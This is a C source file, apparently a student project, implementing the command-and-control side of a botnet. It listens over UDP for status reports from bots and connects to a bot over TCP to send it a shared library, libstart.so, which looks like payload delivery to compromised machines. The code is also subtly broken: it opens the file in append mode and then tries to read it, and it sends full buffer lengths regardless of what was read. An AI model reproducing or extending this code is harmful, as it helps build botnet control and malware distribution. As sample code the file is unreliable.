#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <libnetwork.h>
#include <libthrd.h>
#include "../BOT/utils.h"

#define UDP_PORT_ECOUTE "4242"
#define IP_BOT "127.0.0.1"
#define PORT_TCP_BOT 4242
#define TAILLE 20
#define MAX 1000
/**
 * int traitementUDP(info_bot_t structure, int taille)
 * Fonction de traitement de la réception UDP (pour le moment printf la structure seulement)
 *
 * param structure du bot qu'elle a reçu
 * param taille de la reception (argument utile dans la librairie)
 */
int traitementUDP(info_bot_t structure, int taille)
{
    (void)taille;
    //impressionStructure(structure);
    printf("***************La structure ************ \n");
    printf("L'ID dans la structure est : %s\n", structure.ID);
    printf("Le temps de vie dans la structure est : %s milliseconds\n", structure.life_time);
    printf("L'état dans la structure est : %c\n", structure.etat);
    return 0;
}

/**
 * void lancementBoucleServeurUDP(void *s)
 * Fonction wrapper permettant de donner les arguments à  
 * la fct boucleServeurUDP vu que elle est lancée dans un thread
 *
 * param pointeur vers la socket UDP
 * 
 */
void lancementBoucleServeurUDP(void *s)
{
    int socket_udp = *((int *)s);
    boucleServeurUDP(socket_udp, traitementUDP);
}

/**
 * void ecriture_socket(void *s)
 * Fonction qui écrit un msg dans la socket TCP puis la ferme à la fin 
 * TO DO : il enverra des ordres et non un msg
 * param pointeur vers la socket TCP
 * 
 */
void ecriture_socket(void *s)
{ /* 
    char *msg = "Hello from CC\n";
    int socket_tcp = *((int *)s);
    // Obtient une structure de fichier 
    if (write(socket_tcp, msg, strlen(msg)) < 0)
    {
        perror("ecriture_socket.write");
        exit(-1);
    }
    close(socket_tcp); */
    char buff[MAX];
    int socket_tcp = *((int *)s);
    // create file
    FILE *fp;
    fp = fopen("libstart.so", "a"); 
    if (fp == NULL)
    {
        printf("Error IN Opening File .. \n");
        return;
    }

    while (fgets(buff, MAX, fp) != NULL)   // fgets reads upto MAX character or EOF
        write(socket_tcp, buff, sizeof(buff)); // sent the file data to stream

    fclose(fp); // close the file
    printf("File Sent successfully !!! \n");

}

/**
 * void init_socket()
 * Fonction qui crée une socket, lui met des options TCP, la connecte à un serveur TCP, 
 * une fois la connexion faite elle lance la fct wrapper qui lance un thread avec l'écriture sur la socket
 * 
 * TO DO : remplacer IP_BOT et PORT_BOT par des valeurs dynamiques qu'on récupère de la partie UDP
 */
void init_socket(void *arg)
{
    (void)arg;
    // Structure addresse du serveur
    struct sockaddr_in servaddr;
    int socket_tcp;
    socket_tcp = socket(AF_INET, SOCK_STREAM, 0);

    /*   
    Création de la socket :
    s = file descriptor de la socket, 
    AF_INET (socket internet), SOCK_DGRAM (datagramme, UDP, sans connexion)
     */
    if (socket_tcp < 0)
    {
        //Test de la valeur de retour de la socket
        perror("sendUDPBroadcast.socket");
        exit(-1);
    }

    servaddr.sin_family = AF_INET;
    //On met l'addresse du serveur avec qui on veut communiquer
    servaddr.sin_addr.s_addr = inet_addr(IP_BOT);
    //Pareil pour le port
    servaddr.sin_port = htons(PORT_TCP_BOT);

    //connexion avec le serveur TCP ( qui se trouve sur le bot)
    if (connect(socket_tcp, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
    {
        printf("connection with the server failed...\n");
        exit(0);
    }
    else
    {
        printf("connected to the server..\n");
        ecriture_socket(&socket_tcp);
    }
    return;
}
/**
 * void partie_udp()
 * Fonction wrapper qui initialise le serveur UDP dans un thread
 * 
 */
void partie_udp()
{
    char *port_udp = UDP_PORT_ECOUTE;
    printf("############ Partie UDP ############\n");
    int socket_udp = initialisationServeurUDP(port_udp);
    if (socket_udp < 0)
    {
        fprintf(stderr, "Initialisation du serveur UDP impossible\n");
        exit(-1);
    }

    //Lancement de la boucle d'ecoute UDP dans un thread
    if (lanceThread(lancementBoucleServeurUDP, (void *)&socket_udp, sizeof(socket_udp)) < 0)
    {
        perror("boucleServeurUDP.lanceThread");
        exit(-1);
    }
    //close(socket_udp);
}
/**
 * void partie_tcp()
 * Fonction wrapper qui initialise le client TCP dans un thread
 * 
 */
void partie_tcp()
{

    printf("############ Partie TCP ############\n");
    lanceThread(init_socket, (void *)NULL, 0);
}

int main()
{
    //PARTIE Client TCP dans un THREAD
    partie_tcp();
    // PARTIE SERVEUR UDP (écoute) dans un THREAD
    partie_udp();
    //while true pour ne pas sortir du main et laisser
    //le temps aux fct de faire des threads etc
    while (1)
    {
    }

    return 0;
}